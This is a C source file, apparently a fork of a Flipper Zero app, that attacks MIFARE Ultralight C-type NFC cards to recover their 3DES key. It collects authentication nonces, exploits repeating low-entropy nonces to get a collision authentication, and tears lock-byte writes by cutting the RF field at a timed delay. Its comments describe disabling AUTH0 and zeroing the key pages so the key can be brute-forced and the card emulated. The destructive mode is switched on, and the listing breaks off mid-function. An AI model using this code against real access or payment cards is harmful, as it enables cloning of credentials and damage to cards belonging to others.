#pragma GCC optimize("O3")
#pragma GCC optimize("-funroll-all-loops")

#pragma GCC diagnostic push
// Suppress specific warnings
#pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"
#pragma GCC diagnostic ignored "-Wunused-function"

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_cortex.h>
#include <furi_hal_gpio.h>
#include <furi_hal_spi.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <input/input.h>
#include <furi_hal_nfc.h>
#include <lib/drivers/st25r3916.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a_listener.h>
#include <lib/nfc/protocols/mf_ultralight/mf_ultralight.h>
#include <nfc/nfc.h>
#include <nfc/nfc_device.h>
#include <nfc/nfc_listener.h>
#include <stream/stream.h>
#include <stream/buffered_file_stream.h>
#include <storage/storage.h>
#include <mbedtls/des.h>
#include <stddef.h>

#include "ulcfkey_brute.h"

#define TAG                            "ULCFKey"
#define CMD_WUPA                       0x52 // 7 bits
#define CMD_READ_PAGE                  0x30
#define CMD_WRITE_PAGE                 0xA2
#define CMD_ANTICOLL                   0x93
#define CMD_ANTICOLL_2                 0x95
#define CMD_SELECT                     0x93
#define CMD_SELECT_2                   0x95
#define NFC_APP_FOLDER                 EXT_PATH("nfc")
#define NFC_APP_EXTENSION              ".nfc"
#define MF_ULTRALIGHT_C_DICT_USER_PATH EXT_PATH("nfc/assets/mf_ultralight_c_dict_user.nfc")
#define MF_ULCF_NONCE_PATH             EXT_PATH("nfc/ulcfkey_recovery.log")
#define ULCFKEY_SESSION_PATH           APP_DATA_PATH("session.bin")
#define ULCFKEY_SESSION_TEMP_PATH      APP_DATA_PATH("session.tmp")
#define ULCFKEY_SESSION_BACKUP_PATH    APP_DATA_PATH("session.bak")
#define ULCFKEY_LEGACY_SESSION_PATH    EXT_PATH("apps_data/ulcfkey_fixed/session.bin")
#define ULCFKEY_LEGACY_BACKUP_PATH     EXT_PATH("apps_data/ulcfkey_fixed/session.bak")
#define ULCFKEY_SAVED_CARD_PREFIX      "ulcfkey_emulation_"
#define TEAR_DELAY_US                  850
// fork SAFETY: 0 = stop after the collision auth succeeds, WITHOUT tearing/overwriting
// the card (read-only, non-destructive). Set to 1 only on a sacrificial card to run the
// full key-recovery, which TEARS lock bytes, disables AUTH0 and ZEROES the key pages.
#define ENABLE_DESTRUCTIVE_WRITES      1

// TODO: Dictionary attack against nt100 with known keys matching expected LFSR properties before bruteforcing

// Attack parameters
#define MAX_NONCES 50

// Structure to store nonce and count
typedef struct {
    uint8_t nonce[8];
    uint16_t count;
} NonceCount;

typedef enum {
    AppStateMain,
    AppStateNewConfirm,
    AppStateHelp,
    AppStateSavedCards,
    AppStateSavedCardDetail,
    AppStateCollectNTReady,
    AppStateCollectNTInit,
    AppStateCollectNTWaiting,
    AppStateCollectNRReady,
    AppStateCollectNRInit,
    AppStateCollectNRWaiting,
    AppStateCrackReady,
    AppStateCrackInit,
    AppStateCrackInitialAuth,
    AppStateCrackTearLockbytes,
    AppStateCrackOverwriteAuth0,
    AppStateCrackCollectNonces,
    AppStateCrackResumeInit,
    AppStateRecoverKeyReady,
    AppStateRecoverKeyRunning,
    AppStateRestoreReady,
    AppStateRestoreRunning,
    AppStateComplete,
    AppStateError,
} AppState;

typedef struct {
    uint8_t scroll_pos;
    uint8_t scroll_num;
    FuriString* text;
} HelpState;

typedef struct {
    AppState state;
    uint8_t menu_selection;
    uint16_t saved_card_selection;
    uint16_t saved_card_count;
    char saved_card_name[64];
    uint8_t saved_card_uid[7];
    uint8_t saved_card_key[16];
    bool saved_card_loaded;
    const char* error;
    uint8_t auth1_response[8];
    uint8_t auth2_response[16];
    bool auth2_received;
    uint8_t uid[10];
    uint8_t uid_len;
    bool is_vulnerable;
    bool is_static_key;
    bool field_active;
    bool emulate_active;
    NonceCount nonces[MAX_NONCES];
    uint8_t common_nonce[8];
    uint8_t common_nonce_response[16];
    uint8_t nonce_100[8];
    uint8_t nonce_75[8];
    uint8_t nonce_50[8];
    uint8_t nonce_25[8];
    uint32_t tear_delay;
    bool lock_bytes_reset;
    uint8_t lock_bytes_restore[2];
    uint8_t auth0_config_restore;
    uint16_t unique_nonces; // Track number of unique nonces
    uint32_t total_nonces; // Track total nonces seen
    uint32_t nt_saved_count;
    // --- fork additions ---
    bool spi_held; // do we currently hold the NFC SPI bus?
    uint32_t auth_attempts; // CrackInitialAuth attempts (UI)
    uint32_t tear_attempts; // CrackTearLockbytes attempts (UI)
    uint8_t crack_key_idx; // nonce-collection key page 0..3 (UI)
    uint32_t anim_tick; // frame counter for animations (UI)
    MfUltralightPage card_pages[48]; // fork: dumped pages for NR emulation
    bool pages_dumped; // fork: is card_pages valid?
    bool card_present; // fork: did the last auth attempt see the card?
    uint8_t cand_response[MAX_NONCES][16]; // fork: reader AUTH2 per candidate nonce
    bool cand_signed[MAX_NONCES]; // fork: candidate signed by reader?
    uint8_t num_candidates; // fork: candidates to sign/match
    uint8_t nr_sign_idx; // fork: candidate being signed in NR
    uint8_t nr_pending_idx; // fork: candidate used by the latest AUTH1 reply
    bool nr_candidate_pending; // fork: accept AUTH2 only for that AUTH1
    uint8_t cand_signed_count; // fork: how many signed so far
    uint8_t nr_saved_count; // latest candidate count checkpointed to SD
    bool auth_ok_safe_stop; // fork: collision succeeded, stopped before writes
    bool auth_read_ok; // fork: protected page 4 read after collision auth
    uint8_t session_stage;
    bool session_loaded;
    uint8_t recovery_nonce_mask;
    uint8_t key_pages_zeroed_mask;
    uint8_t restore_step;
    UlcfkeyBruteState brute;
    UlcfkeyBruteRuntime* brute_runtime;
    uint32_t brute_last_checkpoint;
    uint32_t brute_run_start_tick;
    uint32_t brute_run_start_candidate;
    ViewPort* view_port;
    Gui* gui;
    NotificationApp* notifications;
    FuriMessageQueue* event_queue;
    Nfc* nfc;
    NfcListener* listener;
    NfcDevice* device;
    HelpState* help_state;
} AppContext;

typedef enum {
    SessionStageEmpty = 0,
    SessionStageNtCollected,
    SessionStageNrCollected,
    SessionStageAuthenticatedDump,
    SessionStageUnlocked,
    SessionStageRecoveryNonces,
    SessionStageBruteforce,
    SessionStageKeyRecovered,
    SessionStageEmulationSaved,
    SessionStageRestored,
} SessionStage;

#define ULCFKEY_SESSION_MAGIC   (0x554C4353UL)
#define ULCFKEY_SESSION_VERSION (2U)

typedef struct {
    uint32_t magic;
    uint16_t version;
    uint16_t size;
    uint32_t checksum;
    uint8_t stage;
    uint8_t uid_len;
    uint8_t uid[10];
    uint8_t is_vulnerable;
    uint8_t is_static_key;
    NonceCount nonces[MAX_NONCES];
    uint16_t unique_nonces;
    uint32_t total_nonces;
    uint8_t common_nonce[8];
    uint8_t cand_response[MAX_NONCES][16];
    uint8_t cand_signed[MAX_NONCES];
    uint8_t num_candidates;
    uint8_t cand_signed_count;
    MfUltralightPage card_pages[48];
    uint8_t pages_dumped;
    uint8_t lock_bytes_reset;
    uint8_t lock_bytes_restore[2];
    uint8_t auth0_config_restore;
    uint32_t tear_delay;
    uint8_t recovery_nonces[4][8];
    uint8_t recovery_nonce_mask;
    uint8_t key_pages_zeroed_mask;
    uint8_t restore_step;
    UlcfkeyBruteState brute;
} UlcfkeySession;

typedef enum {
    EventTypeTick,
    EventTypeKey,
} EventType;

typedef struct {
    EventType type;
    InputEvent input;
} AppEvent;

static void setup_nfc_field(const FuriHalSpiBusHandle* handle) {
    FURI_LOG_I(TAG, "setup_nfc_field");
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    furi_delay_ms(1);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_write_reg(handle, ST25R3916_REG_MODE, ST25R3916_REG_MODE_om_iso14443a);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_BIT_RATE,
        ST25R3916_REG_BIT_RATE_rxrate_106 | ST25R3916_REG_BIT_RATE_txrate_106);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF1, ST25R3916_REG_RX_CONF1_z600k);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_RX_CONF2,
        ST25R3916_REG_RX_CONF2_sqm_dyn | ST25R3916_REG_RX_CONF2_agc_en |
            ST25R3916_REG_RX_CONF2_agc_m);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF3, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF4, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_ISO14443A_NFC, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_EMD_SUP_CONF, 0x00);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_CORR_CONF1,
        ST25R3916_REG_CORR_CONF1_corr_s7 | ST25R3916_REG_CORR_CONF1_corr_s6 |
            ST25R3916_REG_CORR_CONF1_corr_s5 | ST25R3916_REG_CORR_CONF1_corr_s4);
    st25r3916_write_reg(handle, ST25R3916_REG_CORR_CONF2, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_MASK_RX_TIMER, 0x00);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_TIMER_EMV_CONTROL,
        ST25R3916_REG_TIMER_EMV_CONTROL_nrt_emv_off |
            ST25R3916_REG_TIMER_EMV_CONTROL_nrt_step_64fc);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_FIELD_THRESHOLD_ACTV,
        ST25R3916_REG_FIELD_THRESHOLD_ACTV_trg_105mV |
            ST25R3916_REG_FIELD_THRESHOLD_ACTV_rfe_105mV);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_FIELD_THRESHOLD_DEACTV,
        ST25R3916_REG_FIELD_THRESHOLD_DEACTV_trg_75mV |
            ST25R3916_REG_FIELD_THRESHOLD_DEACTV_rfe_75mV);
    st25r3916_write_reg(handle, ST25R3916_REG_ANT_TUNE_A, 0x82);
    st25r3916_write_reg(handle, ST25R3916_REG_ANT_TUNE_B, 0x82);
    st25r3916_get_irq(handle);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_UNMASK_RECEIVE_DATA);
    furi_delay_ms(1);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_OP_CONTROL,
        ST25R3916_REG_OP_CONTROL_tx_en | ST25R3916_REG_OP_CONTROL_rx_en |
            ST25R3916_REG_OP_CONTROL_en);
    furi_delay_ms(10);
    FURI_LOG_I(TAG, "RF field enabled");
}

static void disable_nfc_field(const FuriHalSpiBusHandle* handle) {
    FURI_LOG_I(TAG, "Disabling NFC field");
    st25r3916_write_reg(handle, ST25R3916_REG_OP_CONTROL, 0x00);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);
    furi_delay_ms(1);
    FURI_LOG_I(TAG, "NFC field disabled");
}

static uint16_t calculate_crc16(uint8_t* data, size_t length) {
    uint16_t crc = 0x6363;
    for(size_t i = 0; i < length; i++) {
        uint8_t byte = data[i];
        byte = byte ^ (uint8_t)(crc & 0x00FF);
        byte = byte ^ (byte << 4);
        crc = (crc >> 8) ^ ((uint16_t)byte << 8) ^ ((uint16_t)byte << 3) ^ ((uint16_t)byte >> 4);
    }
    return crc;
}

static uint32_t ulcfkey_session_checksum(const UlcfkeySession* session) {
    const uint8_t* data = (const uint8_t*)session;
    uint32_t hash = 2166136261UL;
    const size_t checksum_offset = offsetof(UlcfkeySession, checksum);
    for(size_t i = 0; i < sizeof(*session); i++) {
        uint8_t value = (i >= checksum_offset && i < checksum_offset + sizeof(session->checksum)) ?
                            0 :
                            data[i];
        hash ^= value;
        hash *= 16777619UL;
    }
    return hash;
}

static void ulcfkey_session_export(const AppContext* app, UlcfkeySession* session) {
    memset(session, 0, sizeof(*session));
    session->magic = ULCFKEY_SESSION_MAGIC;
    session->version = ULCFKEY_SESSION_VERSION;
    session->size = sizeof(*session);
    session->stage = app->session_stage;
    session->uid_len = app->uid_len;
    memcpy(session->uid, app->uid, sizeof(session->uid));
    session->is_vulnerable = app->is_vulnerable;
    session->is_static_key = app->is_static_key;
    memcpy(session->nonces, app->nonces, sizeof(session->nonces));
    session->unique_nonces = app->unique_nonces;
    session->total_nonces = app->total_nonces;
    memcpy(session->common_nonce, app->common_nonce, sizeof(session->common_nonce));
    memcpy(session->cand_response, app->cand_response, sizeof(session->cand_response));
    for(size_t i = 0; i < MAX_NONCES; i++)
        session->cand_signed[i] = app->cand_signed[i];
    session->num_candidates = app->num_candidates;
    session->cand_signed_count = app->cand_signed_count;
    memcpy(session->card_pages, app->card_pages, sizeof(session->card_pages));
    session->pages_dumped = app->pages_dumped;
    session->lock_bytes_reset = app->lock_bytes_reset;
    memcpy(
        session->lock_bytes_restore, app->lock_bytes_restore, sizeof(session->lock_bytes_restore));
    session->auth0_config_restore = app->auth0_config_restore;
    session->tear_delay = app->tear_delay;
    memcpy(session->recovery_nonces[0], app->nonce_100, 8);
    memcpy(session->recovery_nonces[1], app->nonce_75, 8);
    memcpy(session->recovery_nonces[2], app->nonce_50, 8);
    memcpy(session->recovery_nonces[3], app->nonce_25, 8);
    session->recovery_nonce_mask = app->recovery_nonce_mask;
    session->key_pages_zeroed_mask = app->key_pages_zeroed_mask;
    session->restore_step = app->restore_step;
    session->brute = app->brute;
    session->checksum = ulcfkey_session_checksum(session);
}

static void ulcfkey_session_import(AppContext* app, const UlcfkeySession* session) {
    app->session_stage = session->stage;
    app->uid_len = session->uid_len;
    memcpy(app->uid, session->uid, sizeof(app->uid));
    app->is_vulnerable = session->is_vulnerable;
    app->is_static_key = session->is_static_key;
    memcpy(app->nonces, session->nonces, sizeof(app->nonces));
    app->unique_nonces = session->unique_nonces;
    app->total_nonces = session->total_nonces;
    memcpy(app->common_nonce, session->common_nonce, sizeof(app->common_nonce));
    memcpy(app->cand_response, session->cand_response, sizeof(app->cand_response));
    for(size_t i = 0; i < MAX_NONCES; i++)
        app->cand_signed[i] = session->cand_signed[i];
    app->num_candidates = session->num_candidates;
    app->cand_signed_count = session->cand_signed_count;
    memcpy(app->card_pages, session->card_pages, sizeof(app->card_pages));
    app->pages_dumped = session->pages_dumped;
    app->lock_bytes_reset = session->lock_bytes_reset;
    memcpy(app->lock_bytes_restore, session->lock_bytes_restore, sizeof(app->lock_bytes_restore));
    app->auth0_config_restore = session->auth0_config_restore;
    app->tear_delay = session->tear_delay;
    memcpy(app->nonce_100, session->recovery_nonces[0], 8);
    memcpy(app->nonce_75, session->recovery_nonces[1], 8);
    memcpy(app->nonce_50, session->recovery_nonces[2], 8);
    memcpy(app->nonce_25, session->recovery_nonces[3], 8);
    app->recovery_nonce_mask = session->recovery_nonce_mask;
    app->key_pages_zeroed_mask = session->key_pages_zeroed_mask;
    app->restore_step = session->restore_step;
    app->brute = session->brute;
    app->session_loaded = true;
}

static bool ulcfkey_session_save(AppContext* app) {
    UlcfkeySession* session = malloc(sizeof(UlcfkeySession));
    ulcfkey_session_export(app, session);
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, APP_DATA_PATH(""));
    File* file = storage_file_alloc(storage);
    storage_common_remove(storage, ULCFKEY_SESSION_TEMP_PATH);
    bool opened =
        storage_file_open(file, ULCFKEY_SESSION_TEMP_PATH, FSAM_WRITE, FSOM_CREATE_ALWAYS);
    bool ok = opened && storage_file_write(file, session, sizeof(*session)) == sizeof(*session);
    if(opened) {
        storage_file_sync(file);
        storage_file_close(file);
    }
    storage_file_free(file);
    if(ok) {
        storage_common_remove(storage, ULCFKEY_SESSION_BACKUP_PATH);
        storage_common_rename(storage, ULCFKEY_SESSION_PATH, ULCFKEY_SESSION_BACKUP_PATH);
        ok = storage_common_rename(storage, ULCFKEY_SESSION_TEMP_PATH, ULCFKEY_SESSION_PATH) ==
             FSE_OK;
        if(ok) {
            storage_common_remove(storage, ULCFKEY_SESSION_BACKUP_PATH);
        } else {
            storage_common_rename(storage, ULCFKEY_SESSION_BACKUP_PATH, ULCFKEY_SESSION_PATH);
        }
    }
    if(!ok) storage_common_remove(storage, ULCFKEY_SESSION_TEMP_PATH);
    furi_record_close(RECORD_STORAGE);
    free(session);
    if(!ok) FURI_LOG_E(TAG, "Failed to save resumable session");
    return ok;
}

static bool ulcfkey_session_read(Storage* storage, const char* path, UlcfkeySession* session) {
    File* file = storage_file_alloc(storage);
    bool opened = storage_file_open(file, path, FSAM_READ, FSOM_OPEN_EXISTING);
    bool ok = opened && storage_file_read(file, session, sizeof(*session)) == sizeof(*session);
    if(opened) storage_file_close(file);
    storage_file_free(file);
    if(ok) {
        uint32_t checksum = session->checksum;
        ok = session->magic == ULCFKEY_SESSION_MAGIC &&
             session->version == ULCFKEY_SESSION_VERSION && session->size == sizeof(*session) &&
             checksum == ulcfkey_session_checksum(session);
    }
    return ok;
}

static bool ulcfkey_session_load(AppContext* app) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    UlcfkeySession* session = malloc(sizeof(UlcfkeySession));
    bool ok = ulcfkey_session_read(storage, ULCFKEY_SESSION_PATH, session);
    if(!ok) ok = ulcfkey_session_read(storage, ULCFKEY_SESSION_BACKUP_PATH, session);
    bool legacy = false;
    if(!ok) {
        ok = ulcfkey_session_read(storage, ULCFKEY_LEGACY_SESSION_PATH, session);
        if(!ok) ok = ulcfkey_session_read(storage, ULCFKEY_LEGACY_BACKUP_PATH, session);
        legacy = ok;
    }
    furi_record_close(RECORD_STORAGE);
    if(ok) ulcfkey_session_import(app, session);
    free(session);
    if(legacy && ulcfkey_session_save(app)) {
        storage = furi_record_open(RECORD_STORAGE);
        storage_common_remove(storage, ULCFKEY_LEGACY_SESSION_PATH);
        storage_common_remove(storage, ULCFKEY_LEGACY_BACKUP_PATH);
        furi_record_close(RECORD_STORAGE);
    }
    return ok;
}

static void ulcfkey_session_delete(void) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_remove(storage, ULCFKEY_SESSION_PATH);
    storage_common_remove(storage, ULCFKEY_SESSION_TEMP_PATH);
    storage_common_remove(storage, ULCFKEY_SESSION_BACKUP_PATH);
    storage_common_remove(storage, ULCFKEY_LEGACY_SESSION_PATH);
    storage_common_remove(storage, ULCFKEY_LEGACY_BACKUP_PATH);
    furi_record_close(RECORD_STORAGE);
}

/*
static void log_rx_data(uint8_t* rx_buffer, size_t rx_bits) {
    if(rx_bits > 0) {
        size_t bytes = (rx_bits + 7) / 8;
        char hex_str[128] = {0};
        char* p = hex_str;
        for(size_t i = 0; i < bytes; i++) {
            p += snprintf(p, sizeof(hex_str) - (p - hex_str), "%02X ", rx_buffer[i]);
        }
        FURI_LOG_D(TAG, "RX(%d bits): %s", (int)rx_bits, hex_str);
    }
}
*/

/**
 * Send WUPA using the ST25R3916 built-in command for short frames.
 * This correctly transmits 0x52 (7 bits) and expects a 2-byte response (44 00).
 */
static bool send_wupa(const FuriHalSpiBusHandle* handle, uint8_t* rx_buffer, size_t* rx_bits) {
    // Clear FIFO & interrupts first
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);

    // Disable CRC in receive for short frames, and also ensure parity is handled as 7 bits
    st25r3916_set_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);
    st25r3916_change_reg_bits(
        handle,
        ST25R3916_REG_ISO14443A_NFC,
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par),
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par_off | ST25R3916_REG_ISO14443A_NFC_no_rx_par_off));

    // Minimal unmask step: Let's just do the direct command
    uint32_t interrupts =
        (ST25R3916_IRQ_MASK_TXE | ST25R3916_IRQ_MASK_RXS | ST25R3916_IRQ_MASK_RXE |
         ST25R3916_IRQ_MASK_PAR | ST25R3916_IRQ_MASK_CRC | ST25R3916_IRQ_MASK_ERR1 |
         ST25R3916_IRQ_MASK_ERR2);
    // Enable them
    st25r3916_mask_irq(handle, ~interrupts);

    // Issue built-in WUPA short frame
    st25r3916_direct_cmd(handle, ST25R3916_CMD_TRANSMIT_WUPA);

    // TODO: Wait for TXE, RXS, RXE or a timeout
    furi_delay_ms(2);

    bool success = st25r3916_read_fifo(handle, rx_buffer, 64, rx_bits);
    //log_rx_data(rx_buffer, *rx_bits);

    // Re-enable normal CRC for subsequent commands, if desired
    st25r3916_clear_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);
    return success;
}

/**
 * Send command (using full bytes) and read response from FIFO.
 * Typically used for commands that do have parity + CRC in normal ISO14443A (e.g. READ(0x30)).
 */
static bool send_receive_command_full(
    const FuriHalSpiBusHandle* handle,
    const uint8_t* tx_data,
    size_t tx_bits,
    uint8_t* rx_buffer,
    size_t rx_buffer_size,
    size_t* rx_bits,
    bool send_with_crc) {
    // Never expose bytes left by the previous exchange when a short ACK/NAK is received.
    memset(rx_buffer, 0, rx_buffer_size);
    *rx_bits = 0;

    // Clear FIFO & interrupts
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);

    // Normal parity, normal CRC
    st25r3916_change_reg_bits(
        handle,
        ST25R3916_REG_ISO14443A_NFC,
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par),
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par_off | ST25R3916_REG_ISO14443A_NFC_no_rx_par_off));
    st25r3916_clear_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);

    // Write TX data
    st25r3916_write_fifo(handle, tx_data, tx_bits);

    // Choose transmit with or without CRC
    st25r3916_direct_cmd(
        handle,
        send_with_crc ? ST25R3916_CMD_TRANSMIT_WITH_CRC : ST25R3916_CMD_TRANSMIT_WITHOUT_CRC);

    // Wait for the actual end-of-receive interrupt rather than sleeping for a fixed
    // 3 ms. The latter is long enough to make some ULC-compatible chips time out
    // between AUTH1 and AUTH2. Preserve RXE if it arrives together with TXE.
    const uint32_t error_mask = ST25R3916_IRQ_MASK_COL | ST25R3916_IRQ_MASK_ERR1 |
                                ST25R3916_IRQ_MASK_ERR2;
    uint32_t seen_irqs = 0;
    uint32_t timeout_us = 10000;

    while(timeout_us--) {
        seen_irqs |= st25r3916_get_irq(handle);
        if(seen_irqs & error_mask) return false;
        if(seen_irqs & ST25R3916_IRQ_MASK_TXE) break;
        furi_delay_us(1);
    }
    if(!(seen_irqs & ST25R3916_IRQ_MASK_TXE)) return false;

    timeout_us = 10000;
    while(!(seen_irqs & ST25R3916_IRQ_MASK_RXE) && timeout_us--) {
        seen_irqs |= st25r3916_get_irq(handle);
        if(seen_irqs & error_mask) return false;
        furi_delay_us(1);
    }
    if(!(seen_irqs & ST25R3916_IRQ_MASK_RXE)) return false;

    // Now read FIFO
    bool success = st25r3916_read_fifo(handle, rx_buffer, rx_buffer_size, rx_bits);
    //log_rx_data(rx_buffer, *rx_bits);
    return success;
}

/**
 * Send command (using full bytes) and tear lock bytes by interrupting a write with a specific delay.
 * Typically used for commands that do have parity + CRC in normal ISO14443A (e.g. READ(0x30)).
 */
static bool send_receive_command_tear(
    const FuriHalSpiBusHandle* handle,
    const uint8_t* tx_data,
    size_t tx_bits,
    uint32_t delay_us,
    bool send_with_crc) {
    // Clear FIFO & interrupts
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);

    // Normal parity, normal CRC
    st25r3916_change_reg_bits(
        handle,
        ST25R3916_REG_ISO14443A_NFC,
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par),
        (ST25R3916_REG_ISO14443A_NFC_no_tx_par_off | ST25R3916_REG_ISO14443A_NFC_no_rx_par_off));
    st25r3916_clear_reg_bits(handle, ST25R3916_REG_AUX, ST25R3916_REG_AUX_no_crc_rx);

    // Write TX data
    st25r3916_write_fifo(handle, tx_data, tx_bits);

    // Choose transmit with or without CRC
    st25r3916_direct_cmd(
        handle,
        send_with_crc ? ST25R3916_CMD_TRANSMIT_WITH_CRC : ST25R3916_CMD_TRANSMIT_WITHOUT_CRC);

    // Wait ticks using DWT counter
    furi_delay_us(delay_us);

    // Disable NFC field without calling disable_nfc_field to avoid overhead of logging and function call (more precise)
    st25r3916_write_reg(handle, ST25R3916_REG_OP_CONTROL, 0x00);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);
    furi_delay_ms(1);

    return true;
}

static bool
    collect_auth1_challenge(const FuriHalSpiBusHandle* handle, AppContext* app, bool ret_early) {
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // 1) WUPA (7 bits) using built-in short frame
    if(!send_wupa(handle, rx_buffer, &rx_bits)) {
        //FURI_LOG_E(TAG, "WUPA transmit failed");
        // Retry once
        if(!send_wupa(handle, rx_buffer, &rx_bits)) {
            FURI_LOG_E(TAG, "WUPA retransmit failed");
            return false;
        }
    }

    if(rx_bits != 16 || rx_buffer[0] != 0x44 || rx_buffer[1] != 0x00) {
        FURI_LOG_E(TAG, "Invalid WUPA response, %d bits", (int)rx_bits);
        return false;
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // If app->uid_len is 0, then we need to get the UID first, otherwise read page 0
    if(app->uid_len == 0) {
        // ANTICOLL => 16 bits
        uint8_t anticoll[] = {CMD_ANTICOLL, 0x20};
        if(!send_receive_command_full(
               handle, anticoll, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, false)) {
            return false;
        }
        memcpy(app->uid, rx_buffer, 4);

        // SELECT
        uint8_t select_cmd[7];
        select_cmd[0] = CMD_SELECT;
        select_cmd[1] = 0x70;
        memcpy(&select_cmd[2], app->uid, 4);
        uint8_t bcc = app->uid[0] ^ app->uid[1] ^ app->uid[2] ^ app->uid[3];
        select_cmd[6] = bcc;

        if(!send_receive_command_full(
               handle, select_cmd, 7 * 8, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            return false;
        }
        // Cascade check
        if(rx_buffer[0] & 0x04) {
            // Need second level
            uint8_t anticoll2[] = {CMD_ANTICOLL_2, 0x20};
            if(!send_receive_command_full(
                   handle, anticoll2, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, false)) {
                return false;
            }
            memcpy(&app->uid[4], rx_buffer, 4);
            app->uid_len = 7;

            select_cmd[0] = CMD_SELECT_2;
            memcpy(&select_cmd[2], &app->uid[4], 4);
            bcc = rx_buffer[0] ^ rx_buffer[1] ^ rx_buffer[2] ^ rx_buffer[3];
            select_cmd[6] = bcc;

            if(!send_receive_command_full(
                   handle, select_cmd, 7 * 8, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
                return false;
            }
        } else {
            app->uid_len = 4;
        }
    } else {
        uint8_t read_page_cmd[2] = {CMD_READ_PAGE, 0x00};
        if(!send_receive_command_full(
               handle, read_page_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            //FURI_LOG_E(TAG, "Read page transmit failed");
            return false;
        }
        // Expect 16 bytes + CRC => 18 bytes => 144 bits
        if(rx_bits != (18 * 8)) {
            //FURI_LOG_E(TAG, "Invalid READ_PAGE response, %d bits", (int)rx_bits);
            return false;
        }
    }

    // Reset rx_buffer and rx_bits
    memset(rx_buffer, 0, sizeof(rx_buffer));
    rx_bits = 0;

    // 3) AUTH1 command (0x1A 0x00)
    {
        uint8_t auth1_cmd[2] = {0x1A, 0x00};
        if(!send_receive_command_full(
               handle, auth1_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, true)) {
            //FURI_LOG_E(TAG, "Failed to send/receive AUTH1 command");
            return false;
        }

        // Expect 10 bytes + 1st byte = 0xAF => 11 bytes => 88 bits
        if(rx_bits != 88 || rx_buffer[0] != 0xAF) {
            //FURI_LOG_E(TAG, "Invalid AUTH1 response, %d bits", (int)rx_bits);
            return false;
        }
    }

    // Extract encrypted RndB from AUTH1 response
    memcpy(app->auth1_response, rx_buffer + 1, 8);

    if(ret_early) {
        return true;
    }

    // Check if this nonce already exists and increment count if found
    bool found = false;
    for(uint16_t i = 0; i < app->unique_nonces; i++) {
        if(memcmp(app->nonces[i].nonce, app->auth1_response, 8) == 0) {
            app->nonces[i].count++;
            found = true;
            break;
        }
    }

    // If not found and we have room, add it as a new nonce
    if(!found && app->unique_nonces < MAX_NONCES) {
        memcpy(app->nonces[app->unique_nonces].nonce, app->auth1_response, 8);
        app->nonces[app->unique_nonces].count = 1;
        app->unique_nonces++;
        FURI_LOG_I(
            TAG,
            "NT unique: %02X%02X%02X%02X%02X%02X%02X%02X",
            app->auth1_response[0],
            app->auth1_response[1],
            app->auth1_response[2],
            app->auth1_response[3],
            app->auth1_response[4],
            app->auth1_response[5],
            app->auth1_response[6],
            app->auth1_response[7]);
    }

    app->total_nonces++;

    return true;
}

static bool attempt_auth_with_nonce_collision(const FuriHalSpiBusHandle* handle, AppContext* app) {
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    app->card_present = false; // fork: set true once the card actually answers below

    // fork: stay WARM (no field power-cycle, WUPA only) like the NT phase. Diagnostics
    // showed this card emits low-entropy repeating nonces while continuously powered, but a
    // cold power-up reseeds it to a fresh random value -- so cold-cycling here destroyed the
    // collision. The field was enabled once in AppStateCrackInit and stays on across attempts.

    // 1) WUPA (7 bits) using built-in short frame
    if(!send_wupa(handle, rx_buffer, &rx_bits)) {
